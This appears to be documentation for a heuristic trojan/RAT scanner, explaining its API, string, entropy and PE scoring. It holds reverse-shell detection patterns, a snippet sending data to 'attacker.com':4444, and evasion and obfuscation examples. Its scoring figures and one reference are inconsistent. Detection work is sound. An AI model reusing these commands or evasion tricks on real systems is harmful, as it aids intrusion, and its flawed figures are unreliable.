# Module 11: Trojan Detection System

**Developer:** Sai Srujan Murthy  
**Contact:** saisrujanmurthy@gmail.com  
**Category:** Malware Detection | Heuristic Analysis

---

## Overview

The **Trojan Detection System** is an advanced heuristic scanner designed to identify Remote Access Trojans (RATs) and malicious binaries through behavioral analysis. Unlike signature-based detection, this system analyzes code patterns, API usage, and suspicious strings to detect both known and zero-day threats.

### What is a Trojan?

A **Trojan** (or Trojan Horse) is malicious software disguised as legitimate software. Unlike viruses and worms, Trojans do not self-replicate. They rely on social engineering to trick users into executing them.

**Common Trojan Types:**
- **RAT (Remote Access Trojan)**: Allows attacker remote control
- **Banking Trojan**: Steals financial credentials
- **Ransomware**: Encrypts files, demands payment
- **Backdoor**: Creates unauthorized access channel
- **Keylogger**: Records keystrokes

**Famous Examples:**
- **njRAT (Bladabindi)**: Popular RAT in Middle East
- **DarkComet**: Full-featured RAT with keylogger
- **QuasarRAT**: Open-source C# RAT
- **Emotet**: Banking trojan turned botnet loader
- **Zeus/Zbot**: Banking credential stealer

---

## Detection Methodologies

### Signature-Based Detection (Traditional)

**How it Works:**
1. Scan file for known byte patterns
2. Compare hash against malware database
3. Match = Detection

**Advantages:**
- ✅ Very fast (milliseconds)
- ✅ Near-zero false positives
- ✅ Easy to implement
- ✅ Low resource usage

**Disadvantages:**
- ❌ Only detects known malware
- ❌ Trivial to evade (single byte change)
- ❌ Requires constant updates
- ❌ Useless against zero-days
- ❌ Polymorphic malware defeats it

**Example:**
```python
# Simple signature scan
malware_hash = hashlib.sha256(file_data).hexdigest()
if malware_hash in signature_database:
    return "MALWARE DETECTED"
```

### Heuristic-Based Detection (Modern)

**How it Works:**
1. Analyze program behavior patterns
2. Identify suspicious API combinations
3. Detect anomalous string patterns
4. Calculate suspicion score
5. Threshold-based classification

**Advantages:**
- ✅ Detects unknown/zero-day malware
- ✅ Catches polymorphic variants
- ✅ Analyzes actual behavior
- ✅ Harder to evade
- ✅ Proactive defense

**Disadvantages:**
- ❌ Higher false positive rate
- ❌ Slower analysis (seconds)
- ❌ Requires tuning
- ❌ More complex implementation
- ❌ Can be fooled by obfuscation

**Example:**
```python
# Heuristic analysis
score = 0
if 'GetAsyncKeyState' in imports and 'InternetOpen' in imports:
    score += 35  # Keylogger + network = suspicious
if 'CreateProcess' in imports and 'WriteProcessMemory' in imports:
    score += 30  # Process injection
return "SUSPICIOUS" if score > 60 else "CLEAN"
```

### Hybrid Approach (Best Practice)

Modern AV solutions combine both:

```
[Signature Scan] → Known malware? → BLOCK
        ↓ No
[Heuristic Scan] → Suspicious? → INVESTIGATE
        ↓ No
[Behavioral Sandbox] → Malicious actions? → BLOCK
        ↓ No
    ALLOW
```

---

## Features

### 1. Import Analysis (API Pattern Detection)

Scans PE import table for suspicious API combinations across 7 behavioral categories:

#### **Category 1: Keylogger Behavior** (Score: 35)

**Suspicious APIs:**
- `GetAsyncKeyState`: Monitors keyboard state
- `GetKeyboardState`: Retrieves keyboard state
- `SetWindowsHookEx`: Installs keyboard hook
- `GetForegroundWindow`: Gets active window (for context)

**Why Suspicious:**
RATs use these to capture keystrokes and send to C2 server.

**Detection Logic:**
```python
if count(keylogger_apis) >= 2:
    score += 35
```

**Real Example (njRAT):**
```c
// Keylogging component
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        if (GetAsyncKeyState(VK_RETURN) & 0x8000) {
            SendToC2Server(keylog_buffer);
        }
    }
}
```

#### **Category 2: Remote Access** (Score: 30)

**Suspicious APIs:**
- `WinExec`: Execute commands
- `CreateProcess`: Spawn processes
- `ShellExecute`: Launch files/URLs
- `CreateRemoteThread`: Inject code into other processes

**Why Suspicious:**
Core functionality for remote command execution.

**Detection Logic:**
```python
if count(remote_access_apis) >= 2:
    score += 30
```

**Real Example (DarkComet):**
```c
// Remote command execution
void ExecuteCommand(char* cmd) {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}
```

#### **Category 3: Network Communication** (Score: 20)

**Suspicious APIs:**
- `InternetOpen`: Initialize HTTP connection
- `InternetConnect`: Connect to remote host
- `socket`: Create network socket
- `connect`: Establish TCP connection
- `send`/`recv`: Data transmission

**Why Suspicious:**
Essential for C2 communication and data exfiltration.

**Detection Logic:**
```python
if count(network_apis) >= 3:
    score += 20
```

**Real Example (QuasarRAT):**
```csharp
// C2 communication
TcpClient client = new TcpClient();
client.Connect("attacker.com", 4444);
NetworkStream stream = client.GetStream();
stream.Write(data, 0, data.Length);
```

#### **Category 4: Persistence Mechanisms** (Score: 25)

**Suspicious APIs:**
- `RegCreateKey`: Create registry keys
- `RegSetValue`: Write registry values
- `CreateService`: Install Windows service
- `CopyFile`: Copy executable to system directory

**Why Suspicious:**
Ensures malware survives reboots.

**Detection Logic:**
```python
if count(persistence_apis) >= 2:
    score += 25
```

**Common Persistence Methods:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

#### **Category 5: Screen Capture** (Score: 30)

**Suspicious APIs:**
- `BitBlt`: Copy screen pixels
- `GetDC`: Get device context
- `CreateCompatibleDC`: Create memory DC
- `GetDesktopWindow`: Access desktop window

**Why Suspicious:**
RATs capture screenshots for surveillance.

**Detection Logic:**
```python
if count(screen_capture_apis) >= 2:
    score += 30
```

**Real Example (Spy-Net RAT):**
```c
// Screenshot capture
HDC hScreen = GetDC(NULL);
HDC hMemory = CreateCompatibleDC(hScreen);
HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
SelectObject(hMemory, hBitmap);
BitBlt(hMemory, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
```

#### **Category 6: File Operations** (Score: 15)

**Suspicious APIs:**
- `CreateFile`: Open files
- `ReadFile`: Read file data
- `WriteFile`: Write file data
- `DeleteFile`: Remove files

**Why Suspicious:**
Used for data theft, file manipulation, or deploying additional payloads.

**Detection Logic:**
```python
if count(file_operation_apis) >= 3:
    score += 15
```

#### **Category 7: Anti-Analysis Techniques** (Score: 40)

**Suspicious APIs:**
- `IsDebuggerPresent`: Detect debugger
- `CheckRemoteDebuggerPresent`: Detect remote debugger
- `NtQueryInformationProcess`: Query process info
- `GetTickCount`: Timing checks (sandbox detection)

**Why Suspicious:**
Malware tries to detect analysis environments.

**Detection Logic:**
```python
if count(anti_analysis_apis) >= 2:
    score += 40
```

**Common Anti-Analysis Tricks:**
```c
// Debugger detection
if (IsDebuggerPresent()) {
    ExitProcess(0);  // Terminate if debugged
}

// Sandbox detection
DWORD tick1 = GetTickCount();
Sleep(1000);
DWORD tick2 = GetTickCount();
if (tick2 - tick1 < 1000) {
    ExitProcess(0);  // Sandbox acceleration detected
}
```

### 2. String Pattern Analysis

Scans binary for suspicious strings across 5 categories:

#### **Category 1: Reverse Shell Indicators**

**Patterns:**
```regex
cmd\.exe /c
powershell -nop -w hidden -encodedcommand
nc -e /bin/sh
/bin/bash -i
sh -i >& /dev/tcp/
```

**Why Suspicious:**
Classic reverse shell command patterns.

**Real Example (PowerShell Empire):**
```powershell
powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA...
```

#### **Category 2: C2 Communication Patterns**

**Patterns:**
```regex
\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+    # IP:Port
https?://[^\s]+\.onion                     # Tor hidden service
https?://.*\.(tk|ml|ga|cf|gq)              # Free suspicious TLDs
POST /api/beacon
GET /c2/command
```

**Why Suspicious:**
Hardcoded C2 server addresses or beaconing patterns.

#### **Category 3: Credential Theft**

**Patterns:**
```regex
password
login
credential
keylog
token
cookie
session
```

**Why Suspicious:**
Indicates data theft functionality.

**Real Example (Banking Trojan):**
```c
char* targets[] = {
    "banking.com/login",
    "paypal.com/signin",
    "amazon.com/ap/signin"
};
```

#### **Category 4: Persistence Indicators**

**Patterns:**
```regex
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
%APPDATA%
%TEMP%
schtasks /create
```

**Why Suspicious:**
Registry keys and paths used for persistence.

#### **Category 5: Data Exfiltration**

**Patterns:**
```regex
upload
exfil
PUT /upload
POST /submit
ftp\.
sftp\.
```

**Why Suspicious:**
Indicates data upload functionality.

### 3. Entropy Analysis

**Shannon Entropy Formula:**

```
H(X) = -Σ P(xi) × log2(P(xi))
```

Where `P(xi)` = probability of byte value `xi`

**Interpretation:**
- **0.0 - 4.0**: Plain text, low randomness
- **4.0 - 6.0**: Executable code, normal
- **6.0 - 7.5**: Compressed data
- **7.5 - 8.0**: Encrypted/packed data (SUSPICIOUS)

**Why It Matters:**
Malware often uses packing/encryption to hide from AV.

**Example:**
```python
# Plain text entropy
"AAAAAAAAAA" → H = 0.0 (no randomness)

# Executable code entropy
Typical PE file → H = 6.2 (structured)

# UPX packed malware
Packed trojan → H = 7.8 (high randomness)
```

**Detection Logic:**
```python
if entropy >= 7.5:
    score += 25
    finding = "Possible packing/encryption detected"
```

### 4. PE Characteristics Analysis

**Suspicious PE Indicators:**

1. **No Imports**: Legitimate programs import APIs
2. **Suspicious Section Names**: `.packed`, `.upx`, `.enigma`
3. **Low Import Count**: < 5 imports is unusual
4. **Executable Stack**: NX bit disabled
5. **No Digital Signature**: Unsigned executable
6. **Mismatched Extension**: `.exe` claiming to be document

---

## Scoring System

### Score Calculation

```
Total Score = Import Score + String Score + Entropy Score + PE Score
Capped at: 100
```

### Severity Thresholds

| Score Range | Severity | Color | Assessment |
|-------------|----------|-------|------------|
| 0 - 19      | SAFE     | 🟢 Green | Likely benign |
| 20 - 39     | LOW      | 🔵 Blue | Minor suspicions |
| 40 - 59     | MEDIUM   | 🟡 Yellow | Investigate further |
| 60 - 79     | HIGH     | 🟠 Orange | Likely malicious |
| 80 - 100    | CRITICAL | 🔴 Red | Almost certainly malicious |

### Example Scoring

**Case 1: Legitimate Software (Calculator.exe)**
```
Import Analysis:
  - Basic window APIs (CreateWindow, ShowWindow) → 0 points
  - No suspicious combinations → 0 points

String Analysis:
  - UI strings ("Calculate", "Error") → 0 points
  - No C2 patterns → 0 points

Entropy: 5.8 (normal executable code) → 0 points

PE Characteristics:
  - Normal import count (127) → 0 points
  - Valid digital signature → 0 points

TOTAL: 0/100 → SAFE
```

**Case 2: njRAT Sample**
```
Import Analysis:
  - GetAsyncKeyState + SetWindowsHookEx → 35 (keylogger)
  - InternetOpen + socket → 20 (network)
  - RegCreateKey + RegSetValue → 25 (persistence)
  → Subtotal: 80 points

String Analysis:
  - "cmd.exe /c" → reverse shell pattern
  - IP address "192.168.1.100:5552" → C2 pattern
  - "password" "keylog" → credential theft
  → Subtotal: 15 points

Entropy: 7.2 (compressed) → 10 points

PE Characteristics:
  - No digital signature → 5 points

TOTAL: 100/100 (capped) → CRITICAL
```

**Case 3: Borderline (Legitimate Remote Admin Tool)**
```
Import Analysis:
  - CreateProcess + WinExec → 30 (remote access)
  - socket + connect → 20 (network)
  → Subtotal: 50 points

String Analysis:
  - "Remote Desktop" → 0 (legitimate context)
  - "connect" "server" → 5 (network terms)
  → Subtotal: 5 points

Entropy: 6.1 (normal) → 0 points

PE Characteristics:
  - Valid digital signature (Microsoft/TeamViewer) → -10 points

TOTAL: 45/100 → MEDIUM
```

---

## Usage

### Basic Workflow

1. **Launch Module**
   ```bash
   python3 main.py
   Select: 11 (Trojan Detection System)
   ```

2. **Select Target File**
   - Scans `data/` directory for PE files
   - Supports `.exe` and `.dll`
   - Displays available samples

3. **Automated Analysis**
   - Import scanning (1-2 seconds)
   - String pattern matching (2-3 seconds)
   - Entropy calculation (1 second)
   - PE characteristics parsing (1 second)

4. **Review Results**
   - Import findings table
   - String pattern matches
   - Entropy visualization
   - Overall threat assessment
   - Detailed recommendations

### Example Output

```
═══════════════════════════════════════════════════════════════════════
                    🔍 TROJAN DETECTION SYSTEM 🔍
═══════════════════════════════════════════════════════════════════════

Analyzing: njRAT_sample.exe (245 KB)

═══ Import Analysis Findings ═══
┏━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━┳━━━━━━━━━━┓
┃ Behavior Category    ┃ APIs Detected                      ┃ Score ┃ Severity ┃
┡━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━╇━━━━━━━━━━┩
│ Keylogger            │ GetAsyncKeyState, SetWindowsHookEx │  35   │ 🔴 CRITICAL │
│ Remote Access        │ CreateProcess, WinExec              │  30   │ 🔴 CRITICAL │
│ Network              │ InternetOpen, socket, connect       │  20   │ 🟠 HIGH      │
│ Persistence          │ RegCreateKey, RegSetValue           │  25   │ 🔴 CRITICAL │
│ Screen Capture       │ BitBlt, GetDC                       │  30   │ 🔴 CRITICAL │
└──────────────────────┴─────────────────────────────────────┴───────┴──────────────┘

═══ String Pattern Findings ═══
┏━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Pattern Category     ┃ Match Count ┃ Examples                          ┃
┡━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ Reverse Shell        │      3      │ "cmd.exe /c", "powershell -nop"   │
│ C2 Communication     │      2      │ "192.168.1.100:5552", "POST /api" │
│ Credential Theft     │      5      │ "password", "keylog", "login"     │
│ Persistence          │      2      │ "HKCU\...\Run", "%APPDATA%"       │
└──────────────────────┴─────────────┴───────────────────────────────────┘

═══ Entropy Analysis ═══
Shannon Entropy: 7.84 / 8.00

Entropy: [████████████████████████████████████████] 7.84 / 8.00

⚠️  High entropy detected - possible packing or encryption

═══ Overall Threat Assessment ═══

╔═══════════════════════════════════════════════════════════════════════╗
║                      🔴 CRITICAL THREAT DETECTED                      ║
╚═══════════════════════════════════════════════════════════════════════╝

Suspicion Score: [██████████████████████████████████████████████████] 98/100

Threat Level: CRITICAL
Confidence: Very High

═══ Score Breakdown ═══
  Import Analysis:  80 points (57%)
  String Patterns:  15 points (11%)
  Entropy:          25 points (18%)
  PE Characteristics: 5 points (4%)
  ────────────────────────────
  Total:            100 points (capped)

═══ Security Recommendations ═══

🚨 IMMEDIATE ACTION REQUIRED 🚨

1. ⛔ DO NOT EXECUTE THIS FILE
2. 🔒 ISOLATE SYSTEM IMMEDIATELY
3. 🔌 DISCONNECT FROM NETWORK
4. 🧹 Run full system antivirus scan
5. 🔍 Check for IoCs (Indicators of Compromise)
6. 📊 Review system logs for suspicious activity
7. 🔐 Change all passwords from clean system
8. 🛡️  Consider full system reimaging

This file exhibits multiple characteristics of RAT malware:
  - Keylogging capabilities
  - Remote command execution
  - Network C2 communication
  - Persistence mechanisms
  - Screen capture functionality

Recommended Analysis:
  - Submit to VirusTotal (after IoC collection)
  - Analyze in isolated sandbox environment
  - Perform memory forensics if system was infected
  - Contact incident response team

═══════════════════════════════════════════════════════════════════════
```

---

## False Positive Mitigation

### Common False Positives

1. **Legitimate Remote Admin Tools**
   - TeamViewer, AnyDesk, Remote Desktop
   - Solution: Check digital signature, vendor reputation

2. **System Administration Tools**
   - PsExec, PowerShell scripts, Task Scheduler
   - Solution: Context analysis (legitimate publisher)

3. **Development Tools**
   - Debuggers (OllyDbg, x64dbg), hex editors
   - Solution: Whitelist known tool hashes

4. **Penetration Testing Tools**
   - Metasploit, Cobalt Strike, Empire
   - Solution: Authorized security tool database

### Reducing False Positives

**Strategy 1: Digital Signature Verification**
```python
if has_valid_signature and trusted_publisher:
    score -= 20  # Reduce suspicion
```

**Strategy 2: Reputation Analysis**
```python
if known_legitimate_hash:
    return "WHITELIST - SAFE"
```

**Strategy 3: Context-Aware Scoring**
```python
if 'TeamViewer' in strings and digital_signature == 'TeamViewer GmbH':
    # Legitimate remote access tool
    score = max(0, score - 50)
```

**Strategy 4: Behavioral Confirmation**
```python
# Require multiple suspicious categories
critical_categories = sum(score >= 25 for score in category_scores)
if critical_categories < 2:
    severity = max("MEDIUM", severity)  # Downgrade
```

---

## Real-World RAT Family Signatures

### njRAT (Bladabindi)

**Typical Characteristics:**
```
Import Patterns:
  - GetAsyncKeyState (keylogger)
  - InternetConnect (C2)
  - RegCreateKey (persistence)

String Patterns:
  - "[...]" (njRAT marker)
  - "SEE_MASK_NOZONECHECKS"
  - Base64 encoded C2 address

Entropy: 6.5-7.0 (partially packed)

Behavior:
  - Creates mutex "njRAT_Mutex"
  - Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  - C2 Port: Typically 5552
```

### DarkComet RAT

**Typical Characteristics:**
```
Import Patterns:
  - SetWindowsHookEx (keylogger)
  - CreateRemoteThread (injection)
  - BitBlt (screenshots)

String Patterns:
  - "DC_MUTEX-"
  - "UPX" sections (packed)
  - FTP credentials for exfiltration

Entropy: 7.5-7.9 (UPX packed)

Behavior:
  - Drops copy to %APPDATA%
  - Firewall exception: netsh advfirewall
  - Webcam capture functionality
```

### QuasarRAT

**Typical Characteristics:**
```
Import Patterns:
  - .NET assembly (not PE imports)
  - System.Net.Sockets (C2)
  - System.Diagnostics.Process (cmd execution)

String Patterns:
  - "Quasar.Client"
  - "DoUserAction"
  - TCP port 4782 (default)

Entropy: 6.0-6.5 (.NET compiled)

Behavior:
  - .NET framework required
  - Registry persistence
  - Certificate pinning for C2
```

### Emotet

**Typical Characteristics:**
```
Import Patterns:
  - LoadLibrary (dynamic API loading)
  - VirtualAlloc (code injection)
  - CreateThread (execution)

String Patterns:
  - Obfuscated strings (XOR encrypted)
  - Hardcoded RSA public key
  - C2 IP list

Entropy: 7.8-8.0 (heavily packed)

Behavior:
  - Polymorphic (changes hash frequently)
  - Modular (downloads additional payloads)
  - Spreads via email + SMB
```

---

## Advanced Topics

### Polymorphic Malware Detection

**Challenge:** Malware changes its code with each infection.

**Heuristic Approach:**
```python
# Focus on behavioral patterns, not static code
if has_keylogger_apis and has_network_apis:
    # Behavior signature, not byte signature
    score += 50
```

### Obfuscation Techniques

**String Obfuscation:**
```c
// Original
char c2[] = "attacker.com";

// Obfuscated (XOR)
char encrypted[] = {0x25, 0x30, 0x30, 0x25, ...};
for (int i = 0; i < len; i++) {
    encrypted[i] ^= 0x42;  // Decrypt at runtime
}
```

**Detection:**
- High entropy sections
- Decryption loops
- Dynamic string building

**API Obfuscation (Dynamic Import):**
```c
// Evade import scanning
typedef VOID (WINAPI *SleepFunc)(DWORD);
HMODULE kernel32 = LoadLibrary("kernel32.dll");
SleepFunc pSleep = (SleepFunc)GetProcAddress(kernel32, "Sleep");
pSleep(1000);  // No "Sleep" in import table!
```

**Detection:**
- `GetProcAddress` + `LoadLibrary` = suspicious
- Runtime API resolution patterns

### Machine Learning Integration

**Feature Extraction:**
```python
features = [
    api_count,
    string_entropy,
    pe_section_count,
    import_diversity,
    network_api_ratio,
    crypto_api_presence,
    ...
]
```

**Classification:**
```python
# Trained model
from sklearn.ensemble import RandomForestClassifier
model = RandomForestClassifier(n_estimators=100)
prediction = model.predict([features])
# Output: "MALWARE" or "BENIGN"
```

**Advantages:**
- Learns from massive datasets
- Finds subtle patterns
- Adapts to new malware families

**Limitations:**
- Requires training data
- "Black box" decisions
- Adversarial examples can fool it

---

## Integration with Other Modules

### Module 3: Dynamic Sandbox

**Workflow:**
```
1. Heuristic scan → HIGH/CRITICAL score
2. Submit to sandbox for behavioral analysis
3. Monitor actual runtime actions
4. Correlate static + dynamic findings
```

### Module 4: Signature Generator

**Workflow:**
```
1. Detect malware with heuristics
2. Extract unique byte patterns
3. Generate YARA rule for signature database
4. Distribute to endpoint protection
```

### Module 9: Ransomware Helper

**Workflow:**
```
1. Detect encryption APIs (CryptEncrypt, etc.)
2. If score > 60 + has_crypto_apis:
3.     Classify as potential ransomware
4.     Analyze with Ransomware Helper module
```

---

## Limitations

### What This Module Cannot Do

1. **Detect All Malware**: Focused on trojans/RATs
2. **Replace Full AV**: Lacks signatures, real-time protection
3. **Analyze Packed Malware**: Needs unpacking first (use Module 12)
4. **Detect Memory-Only Malware**: Only scans files on disk
5. **Behavioral Analysis**: Static analysis only (use Module 3 sandbox)

### Known Evasion Techniques

1. **Code Obfuscation**: Hides strings/APIs
2. **Packing/Encryption**: Conceals malicious code
3. **Polymorphism**: Changes signature each time
4. **Anti-Heuristic**: Splits suspicious APIs across modules
5. **Fileless Malware**: Runs only in memory (PowerShell)

---

## Best Practices

### For Malware Analysts

1. **Use in Combination**: Heuristics + sandbox + YARA
2. **Threshold Tuning**: Adjust based on environment
3. **Manual Review**: Investigate MEDIUM scores
4. **Context Matters**: Consider file source, purpose
5. **Update Patterns**: Add new API combinations

### For Security Teams

1. **Initial Triage**: Quick assessment of suspicious files
2. **Prioritization**: Focus on HIGH/CRITICAL first
3. **Incident Response**: Rapid malware classification
4. **Threat Hunting**: Scan enterprise for RAT indicators
5. **Training**: Understand false positive scenarios

### For Researchers

1. **Feature Engineering**: Extract new behavioral patterns
2. **ML Training**: Use scores as training labels
3. **Family Classification**: Cluster based on API patterns
4. **Zero-Day Detection**: Test against new samples
5. **Benchmark**: Compare against VirusTotal results

---

## Conclusion

The Trojan Detection System bridges the gap between traditional signature-based AV and advanced behavioral analysis. By combining API pattern detection, string analysis, entropy calculation, and PE characteristic examination, it provides:

- **Proactive Defense**: Detects zero-day trojans
- **Fast Analysis**: Results in 5-10 seconds
- **Educational Value**: Understand RAT behavior
- **Extensibility**: Easy to add new patterns

**Key Takeaway:** Heuristics complement, not replace, signature-based detection. A multi-layered approach provides the best protection.

---

## References

### Academic Papers

1. **Schultz et al. (2001)**: "Data Mining Methods for Detection of New Malicious Executables"
2. **Kolter & Maloof (2006)**: "Learning to Detect and Classify Malicious Executables"
3. **Yan et al. (2018)**: "RAT Detection in Android Apps via PE Analysis"

### Malware Research

- **Malwarebytes Labs**: https://blog.malwarebytes.com/
- **Sophos Naked Security**: https://nakedsecurity.sophos.com/
- **MITRE ATT&CK**: https://attack.mitre.org/

### Tools

- **VirusTotal**: https://www.virustotal.com/
- **Hybrid Analysis**: https://www.hybrid-analysis.com/
- **Any.Run**: https://any.run/

---

**Module Status:** ✅ Production Ready  
**Last Updated:** January 2026  
**Version:** 1.0 FINAL
